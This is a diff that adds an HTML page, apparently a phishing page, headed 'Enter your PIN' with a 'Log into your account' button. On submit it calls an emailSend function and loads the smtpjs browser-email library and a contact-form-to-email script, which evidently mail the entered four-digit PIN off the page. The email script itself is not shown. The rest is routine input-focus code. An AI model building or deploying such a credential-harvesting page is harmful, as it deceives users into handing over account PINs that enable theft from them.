@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/svg+xml" href="lemfavicon.jpeg" />
+    <link rel="stylesheet" href="output.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Mukta+Malar:wght@400;500;600;700;800&display=swap"
+        rel="stylesheet">
+
+    <style>
+        input {
+            height: 25px;
+            width: 25px;
+            border-radius: 100%;
+            caret-color: transparent;
+        }
+
+        input:valid {
+            color: #323232;
+            background-color: #323232;
+        }
+    </style>
+
+</head>
+
+<body class="bg-slate-100">
+
+    <div id="app" class="w-[90%] mx-auto pt-8 max-w-sm">
+        <h1 class="text-2xl font-bold mb-7">Enter your PIN</h1>
+
+
+        <form id="form" onsubmit="emailSend(); reset(); return false;" class="" > 
+            <div class="flex items-center justify-center gap-x-6 mb-5">
+                <input autofocus type="tel" name="pin1" required
+                    class="font-bold pin text-center border-2 focus:border-primary  transition-all text-lg outline-none"
+                    onkeyup="inputInsideOtpInput(this)">
+                <input type="tel" name="pin2" required
+                    class="font-bold pin text-center border-2 focus:border-primary  transition-all text-lg outline-none"
+                    onkeyup="inputInsideOtpInput(this)">
+                <input type="tel" name="pin3" required
+                    class="font-bold pin text-center border-2 focus:border-primary transition-all text-lg outline-none"
+                    onkeyup="inputInsideOtpInput(this)">
+                <input type="tel" name="pin4" required
+                    class="font-bold pin text-center border-2 focus:border-primary transition-all text-lg outline-none"
+                    onkeyup="inputInsideOtpInput(this)" maxlength="1">
+            </div>
+
+            <button disabled type="submit"
+                class="font-bold  text-lg w-full mt-24 bg-primary rounded-full p-3 text-white disabled:bg-slate-300 disabled:text-gray-400 active:scale-95 disabled:pointer-events-none">Log
+                into
+                your
+                account</button>
+        </form>
+    </div>
+
+    <script type="module" src="/main.js"></script>
+</body>
+<script src="https://smtpjs.com/v3/smtp.js"></script>
+<script src="Contact-form-to-email1.js"></script>
+<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  
+
+<script>
+    function inputInsideOtpInput(el) {
+        if (el.value.length > 1) {
+            el.value = el.value[el.value.length - 1];
+        }
+        try {
+            if (el.value == null || el.value == "") {
+                this.foucusOnInput(el.previousElementSibling);
+            } else {
+                this.foucusOnInput(el.nextElementSibling);
+            }
+        } catch (e) {
+            console.log(e);
+        }
+    }
+
+    function foucusOnInput(ele) {
+        ele.focus();
+        let val = ele.value;
+        ele.value = "";
+        // ele.value = val;
+        setTimeout(() => {
+            ele.value = val;
+        })
+    }
+</script>
+
+</html>
